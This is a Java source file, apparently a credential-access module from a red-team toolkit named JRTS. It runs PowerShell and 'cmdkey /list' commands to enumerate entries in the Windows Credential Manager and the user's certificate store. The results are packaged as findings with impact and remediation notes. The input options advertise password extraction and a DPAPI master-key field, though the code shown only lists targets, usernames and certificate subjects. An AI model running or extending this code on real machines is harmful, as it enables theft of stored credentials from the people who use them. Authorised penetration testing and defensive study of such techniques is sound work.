package com.jabber.jrts.modules.credential;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="cred-vault",name="Credential Vault Extraction",description="Extract credentials from Windows Credential Manager vault",category=Category.CREDENTIAL_ACCESS,riskLevel=RiskLevel.HIGH,sourceRef="CredVault",author="JRTS")
public class CredentialVaultModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.select("vault_type","Vault Type",List.of("generic","domain-password","certificate","all")).required().group("Target"),
            ModuleInputField.checkbox("extract_usernames","Extract Usernames").group("Data"),
            ModuleInputField.checkbox("extract_passwords","Extract Passwords").group("Data"),
            ModuleInputField.checkbox("extract_targets","Extract Target Info").group("Data"),
            ModuleInputField.checkbox("enumerate_all","Enumerate All Vaults").group("Options"),
            ModuleInputField.text("dpapi_masterkey","DPAPI Master Key").placeholder("hex_key").group("Decryption"),
            ModuleInputField.checkbox("force_extraction","Force Extraction").group("Options"),
            ModuleInputField.text("advanced","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"cred-vault");
            try{
                String vaultType=input.getOrDefault("vault_type","all");

                ctx.log("[*] Credential Vault Extraction Starting...");
                ctx.log("[*] Vault Type: "+vaultType);
                ctx.reportProgress(15);

                List<String>vaults=new ArrayList<>();
                if(vaultType.equals("generic")||vaultType.equals("all")){
                    vaults.addAll(extractGenericVault());
                }
                if(vaultType.equals("domain-password")||vaultType.equals("all")){
                    vaults.addAll(extractDomainPasswordVault());
                }
                if(vaultType.equals("certificate")||vaultType.equals("all")){
                    vaults.addAll(extractCertificateVault());
                }

                if(vaults.isEmpty()){
                    result.fail("No vault entries found");return result;
                }
                ctx.log("[+] Extracted "+vaults.size()+" vault entries");
                ctx.reportProgress(75);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("vault_type",vaultType);
                findings.put("total_entries",vaults.size());
                findings.put("vault_samples",String.join("|",vaults.stream().limit(3).toList()));
                findings.put("vaults_accessible",vaults.toString().substring(0,Math.min(150,vaults.toString().length())));
                findings.put("impact","Credential vault contains plaintext or decryptable credentials for multiple services");
                findings.put("remediation","Use credential guard, enforce DPAPI, protect vault ACLs, enable auditing on vault access");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private List<String> extractGenericVault(){
        List<String>entries=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"powershell","-Command","Get-StoredCredential | Select-Object -Property Target,UserName"});
            Scanner s=new Scanner(p.getInputStream());
            int count=0;
            while(s.hasNextLine()&&count<5){
                String line=s.nextLine();
                if(line.length()>0){entries.add(line);}
                count++;
            }
            s.close();
        }catch(Exception e){}
        return entries;
    }

    private List<String> extractDomainPasswordVault(){
        List<String>entries=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec("cmdkey /list".split(" "));
            Scanner s=new Scanner(p.getInputStream());
            int count=0;
            while(s.hasNextLine()&&count<5){
                String line=s.nextLine();
                if(line.contains("Target")||line.contains("Type")){
                    entries.add(line);
                }
                count++;
            }
            s.close();
        }catch(Exception e){}
        return entries;
    }

    private List<String> extractCertificateVault(){
        List<String>entries=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"powershell","-Command","Get-ChildItem Cert:\\CurrentUser\\My | Select-Object Thumbprint,Subject"});
            Scanner s=new Scanner(p.getInputStream());
            int count=0;
            while(s.hasNextLine()&&count<5){
                entries.add(s.nextLine());
                count++;
            }
            s.close();
        }catch(Exception e){}
        return entries;
    }
}
